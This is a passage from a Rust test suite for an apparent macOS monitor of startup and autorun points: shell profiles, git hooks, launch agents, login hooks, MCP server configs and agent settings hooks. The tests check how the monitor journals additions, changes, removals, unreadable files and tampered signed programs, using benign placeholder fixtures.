                "INSERT INTO entity (id, type) VALUES (?1, 'file')",
                [subject],
            )
            .unwrap();
            let copied = db
                .execute(
                    "INSERT INTO assertion (layer, subject, predicate, object, reader, scope, kind,
                                            source_ref, basis, observed_at, run_id)
                     SELECT layer, ?1, predicate, object, reader, scope, kind, source_ref, basis,
                            observed_at, run_id
                     FROM assertion WHERE layer = 'live' AND subject = ?2 AND kind = ?3",
                    [subject, like, kind],
                )
                .unwrap();
            assert_eq!(copied, 2, "{like}");
        }
    }
    let watched = |e: &Estate| -> i64 {
        e.rows(
            "SELECT CAST(COUNT(*) AS TEXT) FROM assertion WHERE layer = 'live' AND predicate = 'watched_as'",
        )[0]
        .parse()
        .unwrap()
    };
    let before = watched(&e);
    let said = e.run();
    // Nothing is closed silently: the run's line says it once, with how many.
    let note = "No longer read by this version: what no row of its table of autorun points \
                names, 4 facts set aside and not counted as removed.";
    assert!(said.contains(note), "{said}");
    assert!(!e.run().contains("No longer read by this version"));
    assert_eq!(
        e.rows(
            "SELECT subject, predicate FROM journal WHERE entry = 'retired'
             ORDER BY subject, predicate"
        ),
        [
            "file:machine:mac/.zfoo|located_on",
            "file:machine:mac/.zfoo|watched_as",
            "file:machine:mac/dev/app/.mcp.json#/other/x|located_on",
            "file:machine:mac/dev/app/.mcp.json#/other/x|watched_as",
        ]
    );
    assert_eq!(
        e.rows("SELECT CAST(COUNT(*) AS TEXT) FROM journal WHERE entry = 'removed'"),
        ["0"]
    );
    assert_eq!(
        e.rows("SELECT CAST(COUNT(*) AS TEXT) FROM finding WHERE about LIKE '%.zfoo' OR about LIKE '%/other/x'"),
        ["0"]
    );
    // What this build reads is still watched; the two are not counted any more.
    assert_eq!(watched(&e) + 2, before);
}

#[test]
fn a_machine_named_with_a_slash_a_hash_and_a_space_is_told_what_a_plainly_named_one_is() {
    // An id is never cut into parts: a machine's name may hold any of these, and what is
    // watched, retired, removed or raised does not depend on it.
    let odd = "a/b #c";
    let estates = [
        ("mac", Estate::new("named-plain")),
        (odd, Estate::new("named-odd")),
    ];
    let told = |machine: &str, e: &Estate| -> Vec<String> {
        let id = format!("machine:{machine}").replace('\'', "''");
        let mut told = e.rows(&format!(
            "SELECT entry, replace(scope, '{id}', 'M'), kind, replace(subject, '{id}', 'M'),
                    predicate, replace(COALESCE(old_value, ''), '{id}', 'M'),
                    replace(COALESCE(new_value, ''), '{id}', 'M')
             FROM journal
             WHERE entry NOT IN ('run_started', 'run_finished', 'report', 'finding_raised')
             ORDER BY 1, 2, 3, 4, 5, 6, 7"
        ));
        told.extend(e.rows(&format!(
            "SELECT rule, replace(about, '{id}', 'M'), state, change FROM finding ORDER BY 1, 2"
        )));
        told
    };
    let run = |machine: &str, e: &Estate| {
        let out = e
            .command_as(machine, None, &e.0.join("empty"))
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    for (machine, e) in &estates {
        put(&e.home().join(".zshrc"), "export A=1\n");
        let c = e.checkout("dev/app");
        put(&c.join(".git/hooks/pre-commit"), "#!/bin/sh\n");
        put(
            &c.join(".mcp.json"),
            r#"{"mcpServers": {"x": {"command": "npx"}}}"#,
        );
        run(machine, e);
        run(machine, e);
    }
    let [(plain, p), (_, o)] = &estates;
    // Unchanged: nothing is retired or read again as added.
    assert_eq!(told(odd, o), told(plain, p));
    assert_eq!(
        o.rows("SELECT CAST(COUNT(*) AS TEXT) FROM journal WHERE entry = 'retired'"),
        ["0"]
    );
    for (machine, e) in &estates {
        std::fs::remove_file(e.home().join("dev/app/.git/hooks/pre-commit")).unwrap();
        run(machine, e);
    }
    // A hook removed is gone, and raises its rule.
    assert_eq!(told(odd, o), told(plain, p));
    assert!(
        o.rows("SELECT rule || ' ' || change FROM finding")
            .contains(&"watched.git-hook gone".to_string())
    );
}

// Every level of what holds a watched thing, step by step.

/// A watched thing at one level of what holds it: a key in a file, a file, a folder, a project,
/// a project's `.git`, a folder of the home folder; with a hook in a project that stays, and a
/// key of a place.
#[derive(Clone, Copy, Debug)]
enum Level {
    Key,
    PlaceKey,
    Hook,
    File,
    Folder,
    Project,
    GitDir,
    HomeFolder,
}

impl Level {
    /// The estate without the thing.
    fn base(self, e: &Estate) {
        let h = e.home();
        put(&h.join(".bash_profile"), "export EXAMPLE=2\n");
        put(&h.join(".ssh/config"), "Host example\n");
        put(&e.0.join("system/etc/zshrc"), "# example\n");
        let other = e.checkout("dev/other");
        put(&other.join(".git/hooks/post-checkout"), "#!/bin/sh\n");
        put(
            &other.join(".mcp.json"),
            r#"{"mcpServers": {"y": {"command": "uvx"}}}"#,
        );
        match self {
            Level::Key | Level::Hook => project(e, ""),
            Level::PlaceKey => login(e, ""),
            Level::GitDir => put(
                &h.join("dev/app/.mcp.json"),
                r#"{"mcpServers": {"x": {"command": "npx"}}}"#,
            ),
            _ => {}
        }
    }

    /// What is made unreadable and removed: the thing, or what holds it.
    fn container(self, e: &Estate) -> PathBuf {
        e.home().join(match self {
            Level::Key => "dev/app/.mcp.json",
            Level::PlaceKey => "Library/Preferences/com.apple.loginwindow.plist",
            Level::Hook => "dev/app/.git/hooks/post-merge",
            Level::File => ".zshrc",
            Level::Folder => "Library/LaunchAgents",
            Level::Project => "dev/app",
            Level::GitDir => "dev/app/.git",
            Level::HomeFolder => ".claude",
        })
    }

    /// The thing, in one of its versions.
    fn write(self, e: &Estate, v: &str) {
        let h = e.home();
        match self {
            Level::Key => put(
                &h.join("dev/app/.mcp.json"),
                &format!(
                    r#"{{"mcpServers": {{"x": {{"command": "npx"}}, "k": {{"command": "uvx{v}"}}}}}}"#
                ),
            ),
            Level::PlaceKey => login(e, v),
            Level::Hook => put(&self.container(e), &format!("#!/bin/sh\necho {v}\n")),
            Level::File => put(&self.container(e), &format!("export EXAMPLE={v}\n")),
            Level::Folder => put(
                &h.join("Library/LaunchAgents/org.example.a.plist"),
                &format!(
                    r#"<plist version="1.0"><dict><key>Label</key><string>a{v}</string></dict></plist>"#
                ),
            ),
            Level::Project => project(e, v),
            Level::GitDir => {
                put(&h.join("dev/app/.git/HEAD"), "ref: refs/heads/main\n");
                put(
                    &h.join("dev/app/.git/hooks/pre-commit"),
                    &format!("#!/bin/sh\necho {v}\n"),
                );
            }
            Level::HomeFolder => put(
                &h.join(".claude/settings.json"),
                &format!(
                    r#"{{"hooks": {{"Stop": [{{"command": "echo {v}"}}]}}, "env": {{"A": "1"}}}}"#
                ),
            ),
        }
    }

    /// The thing removed: a key from its file, anything else with what it is in.
    fn remove(self, e: &Estate) {
        match self {
            Level::Key => put(
                &self.container(e),
                r#"{"mcpServers": {"x": {"command": "npx"}}}"#,
            ),
            Level::PlaceKey => login(e, ""),
            _ => {
                let at = self.container(e);
                if at.is_dir() {
                    std::fs::remove_dir_all(at).unwrap();
                } else {
                    std::fs::remove_file(at).unwrap();
                }
            }
        }
    }

    fn shut(self, e: &Estate) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(self.container(e), std::fs::Permissions::from_mode(0o000))
            .unwrap();
    }

    fn open(self, e: &Estate) {
        use std::os::unix::fs::PermissionsExt;
        let at = self.container(e);
        std::fs::set_permissions(&at, std::fs::Permissions::from_mode(0o755)).unwrap();
        if at.is_file() {
            std::fs::set_permissions(&at, std::fs::Permissions::from_mode(0o644)).unwrap();
        }
    }
}

/// The checkout `dev/app` with a hook and a server an agent is told to start.
fn project(e: &Estate, v: &str) {
    let app = e.checkout("dev/app");
    put(
        &app.join(".git/hooks/pre-commit"),
        &format!("#!/bin/sh\necho {v}\n"),
    );
    put(
        &app.join(".mcp.json"),
        &format!(r#"{{"mcpServers": {{"x": {{"command": "npx{v}"}}}}}}"#),
    );
}

/// The user's login window preferences, with a login hook when `v` is not empty.
fn login(e: &Estate, v: &str) {
    let hook = if v.is_empty() {
        String::new()
    } else {
        format!("<key>LoginHook</key><string>/opt/example/hook{v}.sh</string>")
    };
    put(
        &e.home()
            .join("Library/Preferences/com.apple.loginwindow.plist"),
        &format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>{hook}<key>OtherSetting</key><string>x</string></dict></plist>
"#
        ),
    );
}

/// What one full run journaled after the entry `after`, by kind, and the findings it raised as
/// rule and change.
fn step_since(e: &Estate, after: i64) -> String {
    let entries = e.rows(&format!(
        "SELECT entry || ' ' || COUNT(*) FROM journal
         WHERE seq > {after}
           AND entry NOT IN ('run_started', 'run_finished', 'report', 'finding_raised')
         GROUP BY entry ORDER BY entry"
    ));
    let raised = e.rows(&format!(
        "SELECT f.rule || ' ' || f.change FROM journal j JOIN finding f ON f.id = j.subject
         WHERE j.seq > {after} AND j.entry = 'finding_raised' ORDER BY 1"
    ));
    format!("{}; {}", entries.join(", "), raised.join(", "))
}

/// The thing of `level` added, changed, removed, brought back, made unreadable, readable again,
/// unreadable again, removed while the store last saw it unreadable, and brought back, with a
/// full run after each step and every finding marked seen.
fn chain(level: Level) -> Vec<String> {
    let e = Estate::new(&format!("level-{level:?}"));
    level.base(&e);
    e.full();
    e.full();
    let steps: [fn(Level, &Estate); 9] = [
        |l, e| l.write(e, "1"),
        |l, e| l.write(e, "2"),
        |l, e| l.remove(e),
        |l, e| l.write(e, "1"),
        |l, e| l.shut(e),
        |l, e| l.open(e),
        |l, e| l.shut(e),
        |l, e| {
            l.open(e);
            l.remove(e);
        },
        |l, e| l.write(e, "1"),
    ];
    let mut told = Vec::new();
    for step in steps {
        step(level, &e);
        let after = e.last_entry();
        e.full();
        told.push(step_since(&e, after));
        e.seen();
    }
    told
}

#[test]
fn a_thing_added_changed_removed_hidden_and_brought_back_at_every_level_is_told_as_it_happened() {
    // What a step does is told by that step, once: a change with its finding, what is gone with
    // what held it as removed, what cannot be read as not read and never as gone, and what
    // comes back, a project cloned again at the same path among them, as new. The table is what
    // the build before the one table of autorun points told, step for step, but for the digest a
    // thing had, which its removal journals as its arrival did.
    let same = |rule: &str| -> Vec<String> {
        vec![
            format!("added 3; {rule} new"),
            format!("changed 1; {rule} changed"),
            format!("removed 3; {rule} gone"),
            format!("added 3; {rule} new"),
            format!("not_read 1; {rule} not read"),
            "; ".to_string(),
            format!("not_read 1; {rule} not read"),
            format!("removed 3; {rule} gone"),
            format!("added 3; {rule} new"),
        ]
    };
    let lines = |steps: [&str; 9]| -> Vec<String> { steps.map(String::from).to_vec() };
    let both = "added 8; autorun.agent-start new, watched.git-hook new";
    let settings = "added 7; autorun.agent-settings new, autorun.agent-settings new";
    let cases: Vec<(Level, Vec<String>)> = vec![
        (
            Level::Key,
            lines([
                "added 3; autorun.agent-start new",
                "changed 1; autorun.agent-start changed",
                // A server an agent is no longer told to start is no finding.
                "removed 3; ",
                "added 3; autorun.agent-start new",
                "not_read 1; autorun.agent-start not read",
                "; ",
                "not_read 1; autorun.agent-start not read",
                "removed 3; ",
                "added 3; autorun.agent-start new",
            ]),
        ),
        (
            Level::PlaceKey,
            // The hook's program is read too, and is not there: four facts come with it and
            // three go with it, and a hook that cannot be read keeps its program.
            lines([
                "added 7; watched.login-hook new",
                "added 4, changed 1, removed 3; watched.login-hook changed",
                "removed 6; watched.login-hook gone",
                "added 7; watched.login-hook new",
                "not_read 1; watched.login-hook not read",
                "; ",
                "not_read 1; watched.login-hook not read",
                "removed 6; watched.login-hook gone",
                "added 7; watched.login-hook new",
            ]),
        ),
        (Level::Hook, same("watched.git-hook")),
        (Level::File, same("watched.shell-profile")),
        (Level::Folder, same("watched.autostart")),
        (
            Level::Project,
            lines([
                both,
                "changed 2; autorun.agent-start changed, watched.git-hook changed",
                // Its hook and its server go with the project, told as removed.
                "removed 5; ",
                // Cloned again at the same path: new.
                both,
                // A project that cannot be listed is not found, and what was read in it is kept,
                // the ways it holds among it.
                "; ",
                "; ",
                "; ",
                "removed 5; ",
                both,
            ]),
        ),
        (
            Level::GitDir,
            lines([
                "added 8, place_first_read 1; watched.first-read first read",
                "changed 1; watched.git-hook changed",
                // No longer a checkout: its hook and its server go with its `.git`.
                "removed 5; ",
                both,
                "changed 1, not_read 1; watched.git-hook not read",
                "changed 1; ",
                "changed 1, not_read 1; watched.git-hook not read",
                "removed 5; ",
                both,
            ]),
        ),
        (
            Level::HomeFolder,
            lines([
                settings,
                "changed 1; autorun.agent-settings changed",
                "removed 7; ",
                settings,
                "changed 1, not_read 1; autorun.agent-settings not read",
                "changed 1; ",
                "changed 1, not_read 1; autorun.agent-settings not read",
                "removed 7; ",
                settings,
            ]),
        ),
    ];
    let told: Vec<Vec<String>> = std::thread::scope(|s| {
        let runs: Vec<_> = cases
            .iter()
            .map(|(level, _)| s.spawn(move || chain(*level)))
            .collect();
        runs.into_iter().map(|r| r.join().unwrap()).collect()
    });
    for ((level, expected), told) in cases.iter().zip(&told) {
        assert_eq!(told, expected, "{level:?}");
    }
}

// Programs that startup items run.

const TARGET_KIND: &str = "programs that launch agents, daemons and login hooks run";
const TARGET_RULE: &str = "watched.startup-target";
const RUNNER: &str = "file:machine:mac//usr/local/bin/runner";
const AT_CHECKS: &str = "programs are read at each check and not between checks";

/// An invented launch item that starts `argv`, as XML.
fn launch_item(path: &Path, argv: &[&str]) {
    let args: String = argv
        .iter()
        .map(|a| format!("<string>{a}</string>"))
        .collect();
    put(
        path,
        &format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
             <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
             <plist version=\"1.0\"><dict><key>Label</key><string>org.example.item</string>\
             <key>ProgramArguments</key><array>{args}</array></dict></plist>\n"
        ),
    );
}

impl Estate {
    fn system(&self) -> PathBuf {
        self.0.join("system")
    }

    /// A launch agent of the home folder by its name.
    fn agent(&self, name: &str) -> PathBuf {
        self.home()
            .join(format!("Library/LaunchAgents/org.example.{name}.plist"))
    }

    /// A copy of a program macOS ships at `rel` under the system root.
    fn shipped(&self, rel: &str) -> PathBuf {
        let to = self.system().join(rel);
        std::fs::create_dir_all(to.parent().unwrap()).unwrap();
        std::fs::copy("/usr/bin/true", &to).unwrap();
        to
    }

    /// What the open finding of `rule` rests on, as predicate, old and new value.
    fn rests_on(&self, rule: &str) -> Vec<String> {
        let listed = self.contract(&["findings"]);
        let f = listed["findings"]
            .as_array()
            .unwrap()
            .iter()
            .find(|f| f["finding"]["rule"] == rule && f["finding"]["state"] == "open")
            .unwrap();
        let one = self.contract(&["finding", f["finding"]["id"].as_str().unwrap()]);
        let s = |v: &serde_json::Value| v.as_str().unwrap_or("").to_string();
        one["rests_on"]
            .as_array()
            .unwrap()
            .iter()
            .map(|j| {
                [&j["predicate"], &j["old_value_text"], &j["new_value_text"]]
                    .map(s)
                    .join("|")
            })
            .collect()
    }
}

#[test]
fn a_program_replaced_behind_an_untouched_startup_item_raises_one_finding_that_names_every_item() {
    let e = Estate::new("target-replaced");
    e.shipped("usr/local/bin/runner");
    launch_item(&e.agent("a"), &["/usr/local/bin/runner"]);
    launch_item(
        &e.system().join("Library/LaunchDaemons/org.example.b.plist"),
        &["/usr/local/bin/runner", "--quiet"],
    );
    put(
        &e.system()
            .join("Library/Preferences/com.apple.loginwindow.plist"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>\
         <key>LoginHook</key><string>/usr/local/bin/runner</string></dict></plist>\n",
    );
    e.run();
    e.run();
    assert!(e.rules().is_empty());
    put(
        &e.system().join("usr/local/bin/runner"),
        "#!/bin/sh\nexit 0\n",
    );
    e.run();
    let found: Vec<(String, String)> = e.findings(false).into_iter().map(|f| (f.0, f.2)).collect();
    assert_eq!(
        found,
        [(TARGET_RULE.to_string(), "/usr/local/bin/runner".to_string())]
    );
    let rests = e.rests_on(TARGET_RULE);
    let by: Vec<&String> = rests
        .iter()
        .filter(|r| r.starts_with("started_by|"))
        .collect();
    assert_eq!(
        by,
        [
            "started_by||file:machine:mac//Library/LaunchDaemons/org.example.b.plist, \
          file:machine:mac//Library/Preferences/com.apple.loginwindow.plist#/LoginHook, \
          file:machine:mac/Library/LaunchAgents/org.example.a.plist"
        ],
        "{rests:?}"
    );
    assert!(
        rests.contains(&"signed_by|apple, identifier com.apple.true|unsigned".to_string()),
        "{rests:?}"
    );
    // Named by its own path, it leads nowhere else.
    assert!(
        e.rows(&format!(
            "SELECT object FROM assertion WHERE subject = '{RUNNER}' AND predicate = 'links_to'"
        ))
        .is_empty()
    );
}

#[test]
fn a_program_its_publisher_rebuilt_raises_nothing_and_the_journal_holds_the_change() {
    let e = Estate::new("target-publisher");
    let runner = e.shipped("usr/local/bin/runner");
    launch_item(&e.agent("a"), &["/usr/local/bin/runner"]);
    e.run();
    let out = Command::new("/usr/bin/lipo")
        .args(["/usr/bin/true", "-thin", "arm64e", "-output"])
        .arg(&runner)
        .output()
        .unwrap();
    assert!(out.status.success());
    let before = e.last_entry();
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert_eq!(
        e.rows(&format!(
            "SELECT entry, predicate FROM journal WHERE subject = '{RUNNER}' AND seq > {before}"
        )),
        ["changed|has_content"]
    );

    // The same name, its code changed after it was signed: never quiet.
    let mut bytes = std::fs::read(&runner).unwrap();
    bytes[0x1000] ^= 0xff;
    std::fs::write(&runner, bytes).unwrap();
    e.run();
    assert_eq!(e.rules(), [TARGET_RULE]);
    let rests = e.rests_on(TARGET_RULE);
    // What changed is there, and the items that run it now; a signer that did not change is
    // not this run's to show.
    assert!(
        rests
            .iter()
            .any(|r| r.starts_with("has_seal|verifies|does not verify: "))
            && rests.iter().any(|r| r.starts_with("started_by|"))
            && !rests.iter().any(|r| r.starts_with("signed_by|")),
        "{rests:?}"
    );
}

#[test]
fn a_program_that_cannot_be_read_is_said_with_why_and_raises_the_rule_once_read_and_a_file_an_argument_names_is_not_judged()
 {
    let e = Estate::new("target-unread");
    launch_item(&e.agent("bare"), &["runner"]);
    launch_item(&e.agent("relative"), &["bin/runner"]);
    put(
        &e.agent("bundle"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>\
         <key>BundleProgram</key><string>Contents/MacOS/runner</string></dict></plist>\n",
    );
    e.shipped("usr/local/bin/runner");
    put(&e.system().join("etc/runner.conf"), "quiet\n");
    // An argument whose file is in a folder macOS asks permission for is counted unopened.
    put(&e.home().join("Documents/runner.conf"), "quiet\n");
    link(
        e.home().join("Documents/runner.conf").to_str().unwrap(),
        &e.system().join("etc/linked.conf"),
    );
    launch_item(
        &e.agent("config"),
        &[
            "/usr/local/bin/runner",
            "--config",
            "/etc/runner.conf",
            "/etc/linked.conf",
            "/etc/none",
        ],
    );
    // Over the size cap, without taking the space: a file with a hole.
    let large = e.system().join("usr/local/bin/large");
    std::fs::File::create(&large)
        .unwrap()
        .set_len((256 << 20) + 1)
        .unwrap();
    launch_item(&e.agent("large"), &["/usr/local/bin/large"]);
    // A link into a folder macOS asks permission for is not followed.
    put(&e.home().join("Documents/runner"), "#!/bin/sh\n");
    link(
        e.home().join("Documents/runner").to_str().unwrap(),
        &e.system().join("usr/local/bin/linked"),
    );
    launch_item(&e.agent("linked"), &["/usr/local/bin/linked"]);
    // An app named whole, a program named where nothing is, and paths that could leave the
    // root they are read under or name something else.
    std::fs::create_dir_all(e.system().join("Applications/Example.app")).unwrap();
    launch_item(&e.agent("app"), &["/Applications/Example.app"]);
    launch_item(&e.agent("gone"), &["/usr/local/bin/gone"]);
    let nowhere = e.system().join("usr/local/bin/nowhere");
    link(
        nowhere.to_str().unwrap(),
        &e.system().join("usr/local/bin/dangling"),
    );
    launch_item(&e.agent("dangling"), &["/usr/local/bin/dangling"]);
    for (name, path) in [
        ("double", "//usr/local/bin/runner"),
        ("dots", "/usr/local/../bin/runner"),
        ("slash", "/usr/local/bin/runner/"),
    ] {
        launch_item(&e.agent(name), &[path]);
    }
    e.run();
    assert_eq!(
        e.coverage(TARGET_KIND),
        format!(
            "partial|not read in full: \
             files that startup items name in their arguments: 2; \
             startup programs in a folder macOS asks permission for: 1; \
             startup programs inside an app bundle (BundleProgram): 1; \
             startup programs named and not there: 1; \
             startup programs not named by a full path: 5; \
             startup programs that are not a regular file (such as an app named whole): 1; \
             watched file over the size cap: 1; {AT_CHECKS}"
        )
    );
    let mut lacks = e.lacks(TARGET_KIND);
    lacks.sort();
    assert_eq!(
        lacks,
        [
            "files that startup items name in their arguments|",
            "startup programs inside an app bundle (BundleProgram)|",
            "startup programs not named by a full path|",
            "startup programs that are not a regular file (such as an app named whole)|",
            "watched file over the size cap|",
        ]
    );
    let content = |id: &str| {
        e.rows(&format!(
            "SELECT completeness, cause, reason FROM coverage WHERE scope = '{id}'
               AND kind = 'content of a watched file' ORDER BY id DESC LIMIT 1"
        ))
        .concat()
    };
    assert_eq!(
        content("file:machine:mac//usr/local/bin/large"),
        "none|no_reader|over the size cap of 256 MiB"
    );
    let linked = content("file:machine:mac//usr/local/bin/linked");
    assert!(
        linked.starts_with("none|not_given|not looked into: "),
        "{linked}"
    );
    // Named where nothing is: said so, and never shown as a link that leads nowhere, which a
    // link to nothing is.
    for (name, content) in [("gone", "not there"), ("dangling", "dangling link")] {
        assert_eq!(
            e.rows(&format!(
                "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'has_content'
                   AND subject = 'file:machine:mac//usr/local/bin/{name}'"
            )),
            [content]
        );
    }
    // The folder the program's link leads into is named among those not looked into.
    assert_eq!(
        e.rows(
            "SELECT completeness, reason FROM coverage WHERE reader = 'watched-places'
               AND kind = 'folders macOS asks permission for' ORDER BY id DESC LIMIT 1"
        ),
        ["none|not looked into: ~/Documents"]
    );
    // Neither is ever said to hold anything; the program read beside them is.
    assert!(
        e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'has_content'
               AND (subject LIKE '%/large' OR subject LIKE '%/linked')"
        )
        .is_empty()
    );
    assert_eq!(
        e.rows(&format!(
            "SELECT object FROM assertion WHERE layer = 'live' AND subject = '{RUNNER}'
               AND predicate = 'has_content'"
        ))
        .len(),
        1
    );
    // A program read before that can no longer be read is the rule's, with why.
    use std::os::unix::fs::PermissionsExt;
    let runner = e.system().join("usr/local/bin/runner");
    std::fs::set_permissions(&runner, std::fs::Permissions::from_mode(0o000)).unwrap();
    e.run();
    assert_eq!(e.rules(), [TARGET_RULE]);
    assert!(
        content(RUNNER).starts_with("none|failed|"),
        "{}",
        content(RUNNER)
    );
}

#[test]
fn the_first_reading_of_programs_on_a_store_with_a_baseline_is_one_item_read_for_the_first_time() {
    let e = Estate::new("target-upgrade");
    e.shipped("usr/local/bin/runner");
    e.shipped("usr/local/bin/other");
    launch_item(&e.agent("a"), &["/usr/local/bin/runner"]);
    launch_item(&e.agent("b"), &["/usr/local/bin/other"]);
    e.run();
    // As a build that did not read programs left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(&format!(
        "DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage
           WHERE kind = '{TARGET_KIND}' OR scope LIKE '%//usr/local/bin/%');
         DELETE FROM assertion WHERE kind = '{TARGET_KIND}' OR scope LIKE '%//usr/local/bin/%';
         DELETE FROM coverage WHERE kind = '{TARGET_KIND}' OR scope LIKE '%//usr/local/bin/%';
         DELETE FROM unit_read WHERE kind = '{TARGET_KIND}';
         DELETE FROM watched_unit WHERE kind = '{TARGET_KIND}';"
    ))
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ]);
}

#[test]
fn a_program_no_item_names_any_more_is_never_said_to_be_gone() {
    let e = Estate::new("target-unnamed");
    e.shipped("usr/local/bin/runner");
    let agent = e.agent("a");
    launch_item(&agent, &["/usr/local/bin/runner"]);
    e.run();
    put(&agent, "<plist><dict/></plist>\n");
    e.run();
    assert_eq!(e.status()["watched"]["since_last_reading"]["gone"], 0);
}

#[test]
fn a_startup_item_that_could_not_be_read_keeps_its_programs_and_is_said_as_not_read() {
    use std::os::unix::fs::PermissionsExt;
    let e = Estate::new("target-kept");
    e.shipped("usr/local/bin/runner");
    let agent = e.agent("a");
    launch_item(&agent, &["/usr/local/bin/runner"]);
    e.run();
    let by =
        "SELECT subject, object FROM assertion WHERE layer = 'live' AND predicate = 'started_by'";
    let held = e.rows(by);
    assert_eq!(
        held,
        [format!(
            "{RUNNER}|file:machine:mac/Library/LaunchAgents/org.example.a.plist"
        )]
    );
    std::fs::set_permissions(&agent, std::fs::Permissions::from_mode(0o000)).unwrap();
    e.run();
    assert_eq!(e.rows(by), held);
    assert_eq!(
        e.coverage(TARGET_KIND),
        format!(
            "partial|not read in full: startup items that could not be read and whose programs are kept as last read: 1; {AT_CHECKS}"
        )
    );
    // The cause is a failed reading, with nothing named as lacking a reader.
    assert_eq!(
        e.rows(&format!(
            "SELECT cause FROM coverage WHERE kind = '{TARGET_KIND}' ORDER BY id DESC LIMIT 1"
        )),
        ["failed"]
    );
    assert!(e.lacks(TARGET_KIND).is_empty());
}

#[test]
fn an_item_whose_program_cannot_be_told_at_its_first_check_leaves_the_reading_partial() {
    use std::os::unix::fs::PermissionsExt;
    let e = Estate::new("target-untold");
    put(&e.agent("broken"), "not a property list\n");
    let shut = e.agent("shut");
    launch_item(&shut, &["/usr/local/bin/runner"]);
    std::fs::set_permissions(&shut, std::fs::Permissions::from_mode(0o000)).unwrap();
    // An item past what is kept of one, though its own kind reads it whole.
    put(
        &e.agent("large"),
        &format!(
            "<plist version=\"1.0\"><dict><key>Program</key><string>/usr/local/bin/runner\
             </string><key>Comment</key><string>{}</string></dict></plist>\n",
            "x".repeat(1 << 20)
        ),
    );
    e.run();
    assert_eq!(
        e.coverage(TARGET_KIND),
        format!(
            "partial|not read in full: startup items that could not be read and whose programs are kept as last read: 3; {AT_CHECKS}"
        )
    );
}

#[test]
fn a_program_that_is_also_a_watched_file_is_judged_by_its_own_kind_alone() {
    let e = Estate::new("target-elsewhere");
    let profile = e.system().join("etc/zshrc");
    put(&profile, "export EXAMPLE=1\n");
    put(
        &e.system()
            .join("Library/Preferences/com.apple.loginwindow.plist"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>\
         <key>LoginHook</key><string>/etc/zshrc</string></dict></plist>\n",
    );
    e.run();
    e.run();
    assert!(e.rules().is_empty());
    assert_eq!(
        e.coverage(TARGET_KIND),
        format!("full|startup programs watched as another kind and judged there: 1; {AT_CHECKS}")
    );
    put(&profile, "export EXAMPLE=2\n");
    e.run();
    assert_eq!(e.rules(), ["watched.shell-profile"]);
    // Which item runs it is still known.
    assert_eq!(
        e.rows(
            "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'started_by'
               AND subject = 'file:machine:mac//etc/zshrc'"
        ),
        ["file:machine:mac//Library/Preferences/com.apple.loginwindow.plist#/LoginHook"]
    );
}

#[test]
fn a_program_another_kind_watches_and_did_not_read_is_not_read_here_and_leaves_this_partial() {
    let e = Estate::new("target-elsewhere-unread");
    // Past what a watched file is read up to, without taking the space: a file with a hole.
    let profile = e.system().join("etc/zshrc");
    put(&profile, "");
    std::fs::File::options()
        .write(true)
        .open(&profile)
        .unwrap()
        .set_len((8 << 20) + 1)
        .unwrap();
    put(
        &e.system()
            .join("Library/Preferences/com.apple.loginwindow.plist"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>\
         <key>LoginHook</key><string>/etc/zshrc</string></dict></plist>\n",
    );
    // A folder another kind watches only for whether it is there.
    let plugin = "/Library/Security/SecurityAgentPlugins/Example.bundle";
    std::fs::create_dir_all(e.system().join(&plugin[1..])).unwrap();
    launch_item(&e.agent("plugin"), &[plugin]);
    // A file its kind could not look at: its folder lists and does not open.
    use std::os::unix::fs::PermissionsExt;
    let daemons = e.system().join("Library/LaunchDaemons");
    put(
        &daemons.join("org.example.d.plist"),
        "<plist><dict/></plist>\n",
    );
    launch_item(
        &e.agent("daemon"),
        &["/Library/LaunchDaemons/org.example.d.plist"],
    );
    let mode = |m| std::fs::set_permissions(&daemons, std::fs::Permissions::from_mode(m));
    mode(0o444).unwrap();
    e.run();
    mode(0o755).unwrap();
    assert_eq!(
        e.coverage(TARGET_KIND),
        format!(
            "partial|not read in full: \
             startup items that could not be read and whose programs are kept as last read: 1; \
             startup programs watched as another kind and not read there: 3; {AT_CHECKS}"
        )
    );
    // The profile's own kind still says why it did not read it.
    assert_eq!(
        e.rows(
            "SELECT completeness, cause FROM coverage WHERE scope = 'file:machine:mac//etc/zshrc'
               AND kind = 'content of a watched file' ORDER BY id DESC LIMIT 1"
        ),
        ["none|no_reader"]
    );
}

#[test]
fn what_was_known_of_a_programs_code_before_a_reading_that_failed_is_asked_again() {
    use std::os::unix::fs::PermissionsExt;
    let e = Estate::new("target-failed-between");
    let runner = e.shipped("usr/local/bin/runner");
    launch_item(&e.agent("a"), &["/usr/local/bin/runner"]);
    e.run();
    // As if an earlier reading had found another signer: carried while the content and the
    // reading stay as they were.
    let signer = format!(
        "SELECT object FROM assertion WHERE layer = 'live' AND subject = '{RUNNER}'
           AND predicate = 'signed_by'"
    );
    let other = "developer id, team ABCDE12345, identifier org.example.other";
    Connection::open(e.store())
        .unwrap()
        .execute(
            &format!(
                "UPDATE assertion SET object = '{other}' WHERE id IN ({})",
                signer.replace("SELECT object", "SELECT id")
            ),
            [],
        )
        .unwrap();
    e.run();
    assert_eq!(e.rows(&signer), [other]);
    std::fs::set_permissions(&runner, std::fs::Permissions::from_mode(0o000)).unwrap();
    e.run();
